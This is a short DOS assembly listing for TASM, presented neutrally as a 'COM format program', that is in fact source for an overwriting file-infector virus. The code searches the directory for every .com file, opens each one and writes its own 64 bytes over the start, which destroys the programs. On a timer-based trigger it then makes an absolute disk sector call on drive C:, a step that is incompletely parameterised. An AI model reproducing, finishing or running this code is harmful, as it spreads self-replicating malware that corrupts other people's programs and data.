; COM format program for TASM 4
        .286                    ; 80286 processor for COM compatibility
        .model tiny             ; Tiny model for .COM file
        .code                   ; Code section

        org 100h                ; Standard starting offset for COM files

start:  
        mov ah, 4Eh             ; DOS function: Find first file
loc_2:  
        mov dx, offset filespec ; Points to file specification (*.com)
        int 21h                 ; DOS call
        jb  short loc_30        ; If error, jump to loc_30
        
        mov ax, 3D02h           ; DOS function: Open file in read/write mode
        mov dx, 9Eh             ; DTA offset for filename
        int 21h                 ; DOS call
        
        mov bx, ax              ; Save file handle
        mov ah, 40h             ; DOS function: Write to file
        mov dx, 100h            ; Program start address
        mov cx, 40h             ; Size to write (64 bytes)
        int 21h                 ; DOS call
        
        mov ah, 3Eh             ; DOS function: Close file
        int 21h                 ; DOS call
        
        mov ah, 4Fh             ; DOS function: Find next file
        jmp short loc_2         ; Loop for next file

loc_30: 
        mov ah, 2Ch             ; DOS function: Get system time
        int 21h                 ; Returns: CH=hours, CL=minutes, DH=seconds, DL=hundredths
        
        cmp dl, 0Ah             ; Compare hundredths with 10
        ja  short locret_3F     ; If greater, return
        
        mov al, 2               ; Drive number (C:)
        xor dx, dx              ; Starting sector 0
        int 25h                 ; Absolute disk read
                                ; Note: This interrupt requires special handling

locret_3F:
        ret                     ; Return to DOS

; Data
filespec db '*.com',0           ; Search mask for COM files

        end start               ; End with entry point
